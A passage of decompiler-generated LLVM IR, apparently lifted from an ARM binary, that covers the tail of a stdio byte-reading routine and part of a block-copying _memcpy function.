  %v2_f9b8 = inttoptr i32 %v1_f9b8 to i8*
  %v3_f9b8 = load i8, i8* %v2_f9b8, align 1
  %v4_f9b8 = zext i8 %v3_f9b8 to i32
  %v1_f9bc = add nsw i32 %v5_f9a4, -1
  store i32 %v1_f9bc, i32* %r2.global-to-local, align 4
  %v3_f9c0 = sdiv i32 %v1_f9bc, 256
  store i32 %v3_f9c0, i32* %r1.global-to-local, align 4
  store i32 %v4_f9b8, i32* %r0.global-to-local, align 4
  %v2_f9cc = add i32 %v2_f9e8, 40
  %v3_f9cc = inttoptr i32 %v2_f9cc to i32*
  store i32 0, i32* %v3_f9cc, align 4
  %v0_f9d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f9d0 = trunc i32 %v0_f9d0 to i8
  %v2_f9d0 = load i32, i32* @r4, align 4
  %v3_f9d0 = add i32 %v2_f9d0, 1
  %v4_f9d0 = inttoptr i32 %v3_f9d0 to i8*
  store i8 %v1_f9d0, i8* %v4_f9d0, align 1
  br label %dec_label_pc_fa0c

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f99c
  %v1_f9d8 = add i32 %v2_f9e8, 16
  store i32 %v1_f9d8, i32* %r1.global-to-local, align 4
  %v1_f9dc = inttoptr i32 %v1_f9d8 to i32*
  %v2_f9dc = load i32, i32* %v1_f9dc, align 4
  store i32 %v2_f9dc, i32* %r1.global-to-local, align 4
  %v3_f9dc = add i32 %v2_f9e8, 20
  %v4_f9dc = inttoptr i32 %v3_f9dc to i32*
  %v5_f9dc = load i32, i32* %v4_f9dc, align 4
  %v9_f9e0 = icmp eq i32 %v5_f9dc, %v2_f9dc
  br i1 %v9_f9e0, label %dec_label_pc_f9f0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f9d8
  %v2_f9e4 = inttoptr i32 %v2_f9dc to i8*
  %v3_f9e4 = load i8, i8* %v2_f9e4, align 1
  %v4_f9e4 = zext i8 %v3_f9e4 to i32
  store i32 %v4_f9e4, i32* %r0.global-to-local, align 4
  %v6_f9e4 = add i32 %v2_f9dc, 1
  store i32 %v6_f9e4, i32* %r1.global-to-local, align 4
  store i32 %v6_f9e4, i32* %v1_f9dc, align 4
  br label %dec_label_pc_fa7c

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9d8
  %v1_f9f0 = add i32 %v2_f9e8, 4
  %v2_f9f0 = inttoptr i32 %v1_f9f0 to i32*
  %v3_f9f0 = load i32, i32* %v2_f9f0, align 4
  %v4_f9f8 = icmp eq i32 %v3_f9f0, -2
  br i1 %v4_f9f8, label %dec_label_pc_f9fc, label %dec_label_pc_fa14

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9f0
  %v1_f9fc = or i32 %v5_f9a4, 4
  store i32 %v1_f9fc, i32* %r2.global-to-local, align 4
  store i8 %v3_f9a0, i8* %v2_f9a0, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa0c

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f9b0, %dec_label_pc_f9fc
  %v0_fa0c = load i32, i32* %r2.global-to-local, align 4
  %v1_fa0c = trunc i32 %v0_fa0c to i8
  %v2_fa0c = load i32, i32* @r4, align 4
  %v3_fa0c = inttoptr i32 %v2_fa0c to i8*
  store i8 %v1_fa0c, i8* %v3_fa0c, align 1
  br label %dec_label_pc_fa7c

dec_label_pc_fa14:                                ; preds = %dec_label_pc_f9f0
  %v1_fa14 = and i32 %v4_f9a4, 768
  %v2_fa14 = icmp eq i32 %v1_fa14, 0
  br i1 %v2_fa14, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_fa14
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_fa14, %bb19
  store i32 64032, i32* @lr, align 4
  %v1_fa1c = xor i1 %v2_fa14, true
  call void @__pseudo_cond_branch(i1 %v1_fa1c, i32 ptrtoint (i32* @global_var_c4e4.672 to i32))
  %v0_fa20 = load i32, i32* @r4, align 4
  %v1_fa20 = add i32 %v0_fa20, 8
  store i32 %v1_fa20, i32* %r2.global-to-local, align 4
  %v1_fa24 = inttoptr i32 %v1_fa20 to i32*
  %v2_fa24 = load i32, i32* %v1_fa24, align 4
  store i32 %v2_fa24, i32* %r2.global-to-local, align 4
  %v3_fa24 = add i32 %v0_fa20, 12
  %v4_fa24 = inttoptr i32 %v3_fa24 to i32*
  %v5_fa24 = load i32, i32* %v4_fa24, align 4
  %v9_fa28 = icmp eq i32 %v5_fa24, %v2_fa24
  br i1 %v9_fa28, label %dec_label_pc_fa5c, label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %bb20
  %v2_fa30 = add i32 %v0_fa20, 24
  %v3_fa30 = inttoptr i32 %v2_fa30 to i32*
  store i32 %v2_fa24, i32* %v3_fa30, align 4
  %v0_fa34 = load i32, i32* @r4, align 4
  store i32 %v0_fa34, i32* %r0.global-to-local, align 4
  %v2_fa38 = call i32 @__stdio_rfill(i32 %v0_fa34)
  store i32 %v2_fa38, i32* %r0.global-to-local, align 4
  %v2_fa3c = icmp eq i32 %v2_fa38, 0
  br i1 %v2_fa3c, label %dec_label_pc_fa78, label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fa30
  %v0_fa44 = load i32, i32* @r4, align 4
  %v1_fa44 = add i32 %v0_fa44, 20
  %v2_fa44 = inttoptr i32 %v1_fa44 to i32*
  %v3_fa44 = load i32, i32* %v2_fa44, align 4
  %v2_fa48 = add i32 %v0_fa44, 24
  %v3_fa48 = inttoptr i32 %v2_fa48 to i32*
  store i32 %v3_fa44, i32* %v3_fa48, align 4
  %v0_fa4c = load i32, i32* @r4, align 4
  %v1_fa4c = add i32 %v0_fa4c, 16
  %v2_fa4c = inttoptr i32 %v1_fa4c to i32*
  %v3_fa4c = load i32, i32* %v2_fa4c, align 4
  %v1_fa50 = inttoptr i32 %v3_fa4c to i8*
  %v2_fa50 = load i8, i8* %v1_fa50, align 1
  %v3_fa50 = zext i8 %v2_fa50 to i32
  store i32 %v3_fa50, i32* %r0.global-to-local, align 4
  %v5_fa50 = add i32 %v3_fa4c, 1
  store i32 %v5_fa50, i32* %v2_fa4c, align 4
  br label %dec_label_pc_fa7c

dec_label_pc_fa5c:                                ; preds = %bb20
  %v1_fa5c = inttoptr i32 %v0_fa20 to i8*
  store i32 %v0_fa20, i32* %r0.global-to-local, align 4
  %v2_fa60 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_fa60, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fa68 = call i32 @__stdio_READ(i8* %v1_fa5c, i32 %v2_fa60, i32 1)
  store i32 %v5_fa68, i32* %r0.global-to-local, align 4
  %v2_fa6c = icmp eq i32 %v5_fa68, 0
  br i1 %v2_fa6c, label %dec_label_pc_fa78, label %bb21

bb21:                                             ; preds = %dec_label_pc_fa5c
  %v4_fa70 = load i8, i8* %stack_var_-9, align 1
  %v5_fa70 = sext i8 %v4_fa70 to i32
  store i32 %v5_fa70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa7c

dec_label_pc_fa78:                                ; preds = %dec_label_pc_fa5c, %dec_label_pc_f98c, %dec_label_pc_fa30
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa7c

dec_label_pc_fa7c:                                ; preds = %bb, %bb21, %.thread4, %dec_label_pc_fa44, %dec_label_pc_fa0c, %dec_label_pc_fa78
  %v2_fa80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa80, i32* @r4, align 4
  %v8_fa80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_fa80

; uselistorder directives
  uselistorder i32 %v2_f9dc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f99c, { 1, 0, 2 }
  uselistorder i32 %v2_f9e8, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_f95c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_1d4c0.398, { 2, 1, 0 }
  uselistorder i32** @global_var_1d488.430, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fa7c, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_fa78, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_fa0c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_fa90 = load i32, i32* @r1, align 4
  %v1_fa90 = load i32, i32* %r0.global-to-local, align 4
  %v2_fa90 = sub i32 %v0_fa90, %v1_fa90
  %v3_fa90 = icmp ult i32 %v0_fa90, %v1_fa90
  %v4_fa90 = xor i32 %v1_fa90, %v0_fa90
  %v5_fa90 = xor i32 %v2_fa90, %v0_fa90
  %v6_fa90 = and i32 %v5_fa90, %v4_fa90
  %v7_fa90 = icmp slt i32 %v6_fa90, 0
  store i1 %v7_fa90, i1* %cpsr_v.global-to-local, align 1
  %v8_fa90 = icmp slt i32 %v2_fa90, 0
  store i1 %v8_fa90, i1* %cpsr_n.global-to-local, align 1
  %v9_fa90 = icmp eq i32 %v0_fa90, %v1_fa90
  store i1 %v9_fa90, i1* @cpsr_z, align 1
  br i1 %v3_fa90, label %dec_label_pc_fcdc, label %dec_label_pc_fa98

dec_label_pc_fa98:                                ; preds = %entry
  br i1 %v9_fa90, label %.thread122, label %bb

.thread122:                                       ; preds = %bb145, %.thread121, %bb142, %dec_label_pc_fa98
  %merge = phi i32 [ %v0_fa90, %dec_label_pc_fa98 ], [ %v2_fd70, %bb142 ], [ %v11_fd8c, %bb145 ], [ %v7_fd8c, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_fa98
  %v5_fa9c = inttoptr i32 %v1_fa90 to i8*
  store i8* %v5_fa9c, i8** %stack_var_-8, align 4
  %v0_faa0 = load i32, i32* @r2, align 4
  %v2_faa0 = add i32 %v0_faa0, -4
  store i32 %v2_faa0, i32* %r2.global-to-local, align 4
  %v4_faa0 = sub i32 3, %v0_faa0
  %v5_faa0 = and i32 %v4_faa0, %v0_faa0
  %v6_faa0 = icmp slt i32 %v5_faa0, 0
  store i1 %v6_faa0, i1* %cpsr_v.global-to-local, align 1
  %v7_faa0 = icmp slt i32 %v2_faa0, 0
  store i1 %v7_faa0, i1* %cpsr_n.global-to-local, align 1
  %v5_faa4 = icmp slt i32 %v0_faa0, 4
  br i1 %v5_faa4, label %bb132, label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %bb
  %v1_faa8 = urem i32 %v1_fa90, 4
  store i32 %v1_faa8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_faa8 = icmp eq i32 %v1_faa8, 0
  br i1 %v2_faa8, label %dec_label_pc_fab0, label %dec_label_pc_fb54

dec_label_pc_fab0:                                ; preds = %dec_label_pc_faa8
  %v1_fab0 = urem i32 %v0_fa90, 4
  store i32 %v1_fab0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fab0 = icmp eq i32 %v1_fab0, 0
  %extract.t = trunc i32 %v0_fa90 to i2
  br i1 %v2_fab0, label %dec_label_pc_fab8, label %dec_label_pc_fb84

dec_label_pc_fab8:                                ; preds = %dec_label_pc_fab0, %dec_label_pc_fb7c
  %v0_fad092 = phi i32 [ %v1_fa90, %dec_label_pc_fab0 ], [ %v0_fbcc75, %dec_label_pc_fb7c ]
  %v0_facc91 = phi i32 [ %v0_fa90, %dec_label_pc_fab0 ], [ %v0_fb7c, %dec_label_pc_fb7c ]
  %v0_fab8 = phi i32 [ %v2_faa0, %dec_label_pc_fab0 ], [ %v2_fb74, %dec_label_pc_fb7c ]
  %v2_fab8 = add i32 %v0_fab8, -8
  store i32 %v2_fab8, i32* %r2.global-to-local, align 4
  %v4_fab8 = sub i32 7, %v0_fab8
  %v5_fab8 = and i32 %v4_fab8, %v0_fab8
  %v6_fab8 = icmp slt i32 %v5_fab8, 0
  store i1 %v6_fab8, i1* %cpsr_v.global-to-local, align 1
  %v7_fab8 = icmp slt i32 %v2_fab8, 0
  store i1 %v7_fab8, i1* %cpsr_n.global-to-local, align 1
  %v5_fabc = icmp slt i32 %v0_fab8, 8
  br i1 %v5_fabc, label %dec_label_pc_fb0c, label %dec_label_pc_fac0

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fab8
  %v2_fac0 = add i32 %v0_fab8, -28
  store i32 %v2_fac0, i32* %r2.global-to-local, align 4
  %v4_fac0 = sub i32 27, %v0_fab8
  %v5_fac0 = and i32 %v4_fac0, %v2_fab8
  %v6_fac0 = icmp slt i32 %v5_fac0, 0
  store i1 %v6_fac0, i1* %cpsr_v.global-to-local, align 1
  %v7_fac0 = icmp slt i32 %v2_fac0, 0
  store i1 %v7_fac0, i1* %cpsr_n.global-to-local, align 1
  %v5_fac4 = icmp slt i32 %v2_fab8, 20
  br i1 %v5_fac4, label %dec_label_pc_faf8, label %dec_label_pc_fac8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fac0
  %v0_fac8 = load i32, i32* @r4, align 4
  store i32 %v0_fac8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_facc.dec_label_pc_facc_crit_edge, %dec_label_pc_fac8
  %v0_fad0 = phi i32 [ %v12_fad8, %dec_label_pc_facc.dec_label_pc_facc_crit_edge ], [ %v0_fad092, %dec_label_pc_fac8 ]
  %v0_facc = phi i32 [ %v0_facc.pre, %dec_label_pc_facc.dec_label_pc_facc_crit_edge ], [ %v0_facc91, %dec_label_pc_fac8 ]
  %v1_facc = inttoptr i32 %v0_facc to i32*
  %v2_facc = load i32, i32* %v1_facc, align 4
  %v3_facc = add i32 %v0_facc, 4
  %v4_facc = inttoptr i32 %v3_facc to i32*
  %v5_facc = load i32, i32* %v4_facc, align 4
  store i32 %v5_facc, i32* %r4.global-to-local, align 4
  %v6_facc = add i32 %v0_facc, 8
  %v7_facc = inttoptr i32 %v6_facc to i32*
  %v8_facc = load i32, i32* %v7_facc, align 4
  store i32 %v8_facc, i32* %ip.global-to-local, align 4
  %v9_facc = add i32 %v0_facc, 12
  %v10_facc = inttoptr i32 %v9_facc to i32*
  %v11_facc = load i32, i32* %v10_facc, align 4
  store i32 %v11_facc, i32* %lr.global-to-local, align 4
  %v12_facc = add i32 %v0_facc, 16
  store i32 %v12_facc, i32* %r1.global-to-local, align 4
  %v1_fad0 = inttoptr i32 %v0_fad0 to i32*
  store i32 %v2_facc, i32* %v1_fad0, align 4
  %v3_fad0 = add i32 %v0_fad0, 4
  %v4_fad0 = inttoptr i32 %v3_fad0 to i32*
  %v5_fad0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fad0, i32* %v4_fad0, align 4
  %v6_fad0 = add i32 %v0_fad0, 8
  %v7_fad0 = inttoptr i32 %v6_fad0 to i32*
  %v8_fad0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_fad0, i32* %v7_fad0, align 4
  %v9_fad0 = add i32 %v0_fad0, 12
  %v10_fad0 = inttoptr i32 %v9_fad0 to i32*
  %v11_fad0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_fad0, i32* %v10_fad0, align 4
  %v12_fad0 = add i32 %v0_fad0, 16
  store i32 %v12_fad0, i32* %r0.global-to-local, align 4
  %v0_fad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fad4 = inttoptr i32 %v0_fad4 to i32*
  %v2_fad4 = load i32, i32* %v1_fad4, align 4
  store i32 %v2_fad4, i32* @r3, align 4
  %v3_fad4 = add i32 %v0_fad4, 4
  %v4_fad4 = inttoptr i32 %v3_fad4 to i32*
  %v5_fad4 = load i32, i32* %v4_fad4, align 4
  store i32 %v5_fad4, i32* %r4.global-to-local, align 4
  %v6_fad4 = add i32 %v0_fad4, 8
  %v7_fad4 = inttoptr i32 %v6_fad4 to i32*
  %v8_fad4 = load i32, i32* %v7_fad4, align 4
  store i32 %v8_fad4, i32* @ip, align 4
  %v9_fad4 = add i32 %v0_fad4, 12
  %v10_fad4 = inttoptr i32 %v9_fad4 to i32*
  %v11_fad4 = load i32, i32* %v10_fad4, align 4
  store i32 %v11_fad4, i32* @lr, align 4
  %v12_fad4 = add i32 %v0_fad4, 16
  store i32 %v12_fad4, i32* @r1, align 4
  %v1_fad8 = inttoptr i32 %v12_fad0 to i32*
  store i32 %v2_fad4, i32* %v1_fad8, align 4
  %v3_fad8 = add i32 %v0_fad0, 20
  %v4_fad8 = inttoptr i32 %v3_fad8 to i32*
  %v5_fad8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fad8, i32* %v4_fad8, align 4
  %v6_fad8 = add i32 %v0_fad0, 24
  %v7_fad8 = inttoptr i32 %v6_fad8 to i32*
  %v8_fad8 = load i32, i32* @ip, align 4
  store i32 %v8_fad8, i32* %v7_fad8, align 4
  %v9_fad8 = add i32 %v0_fad0, 28
  %v10_fad8 = inttoptr i32 %v9_fad8 to i32*
  %v11_fad8 = load i32, i32* @lr, align 4
  store i32 %v11_fad8, i32* %v10_fad8, align 4
  %v12_fad8 = add i32 %v0_fad0, 32
  store i32 %v12_fad8, i32* %r0.global-to-local, align 4
  %v0_fadc = load i32, i32* %r2.global-to-local, align 4
  %v2_fadc = add i32 %v0_fadc, -32
  store i32 %v2_fadc, i32* %r2.global-to-local, align 4
  %v6_fae0 = icmp slt i32 %v0_fadc, 32
  br i1 %v6_fae0, label %dec_label_pc_fae4, label %dec_label_pc_facc.dec_label_pc_facc_crit_edge

dec_label_pc_facc.dec_label_pc_facc_crit_edge:    ; preds = %dec_label_pc_facc
  %v0_facc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_facc

dec_label_pc_fae4:                                ; preds = %dec_label_pc_facc
  %v4_fae4 = add i32 %v0_fadc, -16
  %v6_fae4 = add i32 %v0_fadc, 2147483616
  %v7_fae4 = and i32 %v4_fae4, %v6_fae4
  %v8_fae4 = icmp slt i32 %v7_fae4, 0
  store i1 %v8_fae4, i1* %cpsr_v.global-to-local, align 1
  %v9_fae4 = icmp slt i32 %v4_fae4, 0
  store i1 %v9_fae4, i1* %cpsr_n.global-to-local, align 1
  %v5_fae8 = icmp slt i32 %v2_fadc, -16
  br i1 %v5_fae8, label %.thread1, label %bb129

bb129:                                            ; preds = %dec_label_pc_fae4
  %v6_fae8 = load i32, i32* @r1, align 4
  %v7_fae8 = inttoptr i32 %v6_fae8 to i32*
  %v8_fae8 = load i32, i32* %v7_fae8, align 4
  store i32 %v8_fae8, i32* @r3, align 4
  %v9_fae8 = add i32 %v6_fae8, 4
  %v10_fae8 = inttoptr i32 %v9_fae8 to i32*
  %v11_fae8 = load i32, i32* %v10_fae8, align 4
  store i32 %v11_fae8, i32* %r4.global-to-local, align 4
  %v12_fae8 = add i32 %v6_fae8, 8
  %v13_fae8 = inttoptr i32 %v12_fae8 to i32*
  %v14_fae8 = load i32, i32* %v13_fae8, align 4
  store i32 %v14_fae8, i32* @ip, align 4
  %v15_fae8 = add i32 %v6_fae8, 12
  %v16_fae8 = inttoptr i32 %v15_fae8 to i32*
  %v17_fae8 = load i32, i32* %v16_fae8, align 4
  store i32 %v17_fae8, i32* @lr, align 4
  %v18_fae8 = add i32 %v6_fae8, 16
  store i32 %v18_fae8, i32* @r1, align 4
  %v7_faec = inttoptr i32 %v12_fad8 to i32*
  store i32 %v8_fae8, i32* %v7_faec, align 4
  %v9_faec = add i32 %v0_fad0, 36
  %v10_faec = inttoptr i32 %v9_faec to i32*
  %v11_faec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_faec, i32* %v10_faec, align 4
  %v12_faec = add i32 %v0_fad0, 40
  %v13_faec = inttoptr i32 %v12_faec to i32*
  %v14_faec = load i32, i32* @ip, align 4
  store i32 %v14_faec, i32* %v13_faec, align 4
  %v15_faec = add i32 %v0_fad0, 44
  %v16_faec = inttoptr i32 %v15_faec to i32*
  %v17_faec = load i32, i32* @lr, align 4
  store i32 %v17_faec, i32* %v16_faec, align 4
  %v18_faec = add i32 %v0_fad0, 48
  store i32 %v18_faec, i32* %r0.global-to-local, align 4
  %v6_faf0 = load i32, i32* %r2.global-to-local, align 4
  %v7_faf0 = add i32 %v6_faf0, -16
  store i32 %v7_faf0, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fae4, %bb129
  %v3_fb00101 = phi i32 [ %v12_fad8, %dec_label_pc_fae4 ], [ %v18_faec, %bb129 ]
  %v0_faf895 = phi i32 [ %v2_fadc, %dec_label_pc_fae4 ], [ %v7_faf0, %bb129 ]
  %v2_faf4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_faf4, i32* @r4, align 4
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_fac0, %.thread1
  %v3_fb00100 = phi i32 [ %v0_fad092, %dec_label_pc_fac0 ], [ %v3_fb00101, %.thread1 ]
  %v0_faf8 = phi i32 [ %v2_fac0, %dec_label_pc_fac0 ], [ %v0_faf895, %.thread1 ]
  %v1_faf8 = add i32 %v0_faf8, 20
  store i32 %v1_faf8, i32* %r2.global-to-local, align 4
  %v3_faf8 = sub i32 0, %v0_faf8
  %v4_faf8 = and i32 %v1_faf8, %v3_faf8
  %v5_faf8 = icmp slt i32 %v4_faf8, 0
  store i1 %v5_faf8, i1* %cpsr_v.global-to-local, align 1
  %v6_faf8 = icmp slt i32 %v1_faf8, 0
  store i1 %v6_faf8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %.thread117, %dec_label_pc_faf8
  %v0_fb0c.pre148 = phi i32 [ %v0_fb0c.pre, %.thread117 ], [ %v1_faf8, %dec_label_pc_faf8 ]
  %v3_fb00 = phi i32 [ %v3_fb0098118, %.thread117 ], [ %v3_fb00100, %dec_label_pc_faf8 ]
  %v1_fb04 = phi i1 [ %v1_fb08, %.thread117 ], [ %v5_faf8, %dec_label_pc_faf8 ]
  %v0_fb04 = phi i1 [ %v0_fb08, %.thread117 ], [ %v6_faf8, %dec_label_pc_faf8 ]
  %v2_fafc = xor i1 %v1_fb04, %v0_fb04
  br i1 %v2_fafc, label %.thread117, label %bb130

bb130:                                            ; preds = %dec_label_pc_fafc
  %v3_fafc = load i32, i32* @r1, align 4
  %v4_fafc = inttoptr i32 %v3_fafc to i32*
  %v5_fafc = load i32, i32* %v4_fafc, align 4
  store i32 %v5_fafc, i32* @r3, align 4
  %v6_fafc = add i32 %v3_fafc, 4
  %v7_fafc = inttoptr i32 %v6_fafc to i32*
  %v8_fafc = load i32, i32* %v7_fafc, align 4
  store i32 %v8_fafc, i32* @ip, align 4
  %v9_fafc = add i32 %v3_fafc, 8
  %v10_fafc = inttoptr i32 %v9_fafc to i32*
  %v11_fafc = load i32, i32* %v10_fafc, align 4
  store i32 %v11_fafc, i32* @lr, align 4
  %v12_fafc = add i32 %v3_fafc, 12
  store i32 %v12_fafc, i32* @r1, align 4
  %v4_fb00 = inttoptr i32 %v3_fb00 to i32*
  store i32 %v5_fafc, i32* %v4_fb00, align 4
  %v6_fb00 = add i32 %v3_fb00, 4
  %v7_fb00 = inttoptr i32 %v6_fb00 to i32*
  %v8_fb00 = load i32, i32* @ip, align 4
  store i32 %v8_fb00, i32* %v7_fb00, align 4
  %v9_fb00 = add i32 %v3_fb00, 8
  %v10_fb00 = inttoptr i32 %v9_fb00 to i32*
  %v11_fb00 = load i32, i32* @lr, align 4
  store i32 %v11_fb00, i32* %v10_fb00, align 4
  %v12_fb00 = add i32 %v3_fb00, 12
  store i32 %v12_fb00, i32* %r0.global-to-local, align 4
  %v3_fb04 = load i32, i32* %r2.global-to-local, align 4
  %v4_fb04 = add i32 %v3_fb04, -12
  store i32 %v4_fb04, i32* %r2.global-to-local, align 4
  %v6_fb04 = sub i32 11, %v3_fb04
  %v7_fb04 = and i32 %v6_fb04, %v3_fb04
  %v8_fb04 = icmp slt i32 %v7_fb04, 0
  store i1 %v8_fb04, i1* %cpsr_v.global-to-local, align 1
  %v9_fb04 = icmp slt i32 %v4_fb04, 0
  store i1 %v9_fb04, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_fafc, %bb130
  %v0_fb0c.pre = phi i32 [ %v4_fb04, %bb130 ], [ %v0_fb0c.pre148, %dec_label_pc_fafc ]
  %v3_fb0098118 = phi i32 [ %v12_fb00, %bb130 ], [ %v3_fb00, %dec_label_pc_fafc ]
  %v1_fb08 = phi i1 [ %v8_fb04, %bb130 ], [ %v1_fb04, %dec_label_pc_fafc ]
  %v0_fb08 = phi i1 [ %v9_fb04, %bb130 ], [ %v0_fb04, %dec_label_pc_fafc ]
  %v2_fb08 = xor i1 %v1_fb08, %v0_fb08
  br i1 %v2_fb08, label %dec_label_pc_fb0c, label %dec_label_pc_fafc

dec_label_pc_fb0c:                                ; preds = %.thread117, %dec_label_pc_fab8
  %v7_fb1c = phi i32 [ %v0_fad092, %dec_label_pc_fab8 ], [ %v3_fb0098118, %.thread117 ]
  %v0_fb0c = phi i32 [ %v2_fab8, %dec_label_pc_fab8 ], [ %v0_fb0c.pre, %.thread117 ]
  %v2_fb0c = add i32 %v0_fb0c, 8
  store i32 %v2_fb0c, i32* %r2.global-to-local, align 4
  %v4_fb0c = sub i32 0, %v0_fb0c
  %v5_fb0c = and i32 %v2_fb0c, %v4_fb0c
  %v6_fb0c = icmp slt i32 %v5_fb0c, 0
  store i1 %v6_fb0c, i1* %cpsr_v.global-to-local, align 1
  %v7_fb0c = icmp slt i32 %v2_fb0c, 0
  store i1 %v7_fb0c, i1* %cpsr_n.global-to-local, align 1
  %v5_fb10 = icmp slt i32 %v0_fb0c, -8
  br i1 %v5_fb10, label %bb132, label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %dec_label_pc_fb0c
  %v6_fb14 = add i32 %v0_fb0c, 4
  store i32 %v6_fb14, i32* %r2.global-to-local, align 4
  %v8_fb14 = sub i32 -5, %v0_fb0c
  %v9_fb14 = and i32 %v8_fb14, %v2_fb0c
  %v10_fb14 = icmp slt i32 %v9_fb14, 0
  store i1 %v10_fb14, i1* %cpsr_v.global-to-local, align 1
  %v11_fb14 = icmp slt i32 %v6_fb14, 0
  store i1 %v11_fb14, i1* %cpsr_n.global-to-local, align 1
  %v5_fb18 = icmp slt i32 %v2_fb0c, 4
  %v6_fb18 = load i32, i32* @r1, align 4
  %v7_fb18 = inttoptr i32 %v6_fb18 to i32*
  %v8_fb18 = load i32, i32* %v7_fb18, align 4
  store i32 %v8_fb18, i32* @r3, align 4
  %v10_fb18 = add i32 %v6_fb18, 4
  br i1 %v5_fb18, label %.thread5, label %bb131

.thread5:                                         ; preds = %dec_label_pc_fb14
  store i32 %v10_fb18, i32* @r1, align 4
  %v8_fb1c = inttoptr i32 %v7_fb1c to i32*
  store i32 %v8_fb18, i32* %v8_fb1c, align 4
  %v9_fb1c = load i32, i32* %r0.global-to-local, align 4
  %v10_fb1c = add i32 %v9_fb1c, 4
  store i32 %v10_fb1c, i32* %r0.global-to-local, align 4
  %v0_fb2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb132

bb131:                                            ; preds = %dec_label_pc_fb14
  %v10_fb20 = inttoptr i32 %v10_fb18 to i32*
  %v11_fb20 = load i32, i32* %v10_fb20, align 4
  store i32 %v11_fb20, i32* @ip, align 4
  %v12_fb20 = add i32 %v6_fb18, 8
  store i32 %v12_fb20, i32* @r1, align 4
  %v7_fb24 = inttoptr i32 %v7_fb1c to i32*
  store i32 %v8_fb18, i32* %v7_fb24, align 4
  %v9_fb24 = add i32 %v7_fb1c, 4
  %v10_fb24 = inttoptr i32 %v9_fb24 to i32*
  %v11_fb24 = load i32, i32* @ip, align 4
  store i32 %v11_fb24, i32* %v10_fb24, align 4
  %v12_fb24 = add i32 %v7_fb1c, 8
  store i32 %v12_fb24, i32* %r0.global-to-local, align 4
  %v6_fb28 = load i32, i32* %r2.global-to-local, align 4
  %v7_fb28 = add i32 %v6_fb28, -4
  store i32 %v7_fb28, i32* %r2.global-to-local, align 4
  br label %bb132

bb132:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_fb0c, %bb, %dec_label_pc_fc68, %dec_label_pc_fbfc, %dec_label_pc_fcd4, %bb131
